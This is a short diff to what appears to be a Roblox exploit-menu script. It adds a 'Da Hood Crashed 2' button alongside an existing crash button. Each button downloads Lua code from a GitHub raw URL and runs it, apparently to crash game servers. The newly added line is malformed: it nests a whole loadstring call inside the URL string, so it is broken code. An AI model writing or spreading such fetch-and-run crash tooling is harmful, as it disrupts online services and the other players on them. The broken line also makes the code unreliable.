@@ -93,6 +93,10 @@ section11:addButton("Da Hood Crashed", function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/22kristina/dhcrash_gen2/main/crash", true))()
 end)
 
+section11:addButton("Da Hood Crashed 2", function()
+loadstring(game:HttpGet("loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()", true))()
+end)
+
 section11:addButton("DO NOT LEAVE THE SERVER while CRASHING", function()
 print("DONt")
 end)
